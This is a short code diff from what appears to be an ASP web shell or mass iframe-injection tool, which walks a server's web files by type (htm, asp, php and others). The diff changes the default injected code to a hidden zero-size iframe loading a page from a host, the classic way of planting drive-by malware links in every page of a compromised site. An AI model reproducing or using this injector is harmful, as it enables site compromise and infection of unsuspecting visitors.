@@ -859,7 +859,7 @@ M=request("M")
 if Ftype="" then Ftype="txt|htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx"
 if Fpath="\" then Fpath=Server.MapPath("\")
 if Fpath="." or Fpath="" then Fpath=Server.MapPath(".")
-if addcode="" then addcode="                                                             "
+if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
 if checkbox="" then checkbox=request("checkbox")
 if pcfile="" then
 pcfileName=Request.ServerVariables("SCRIPT_NAME")
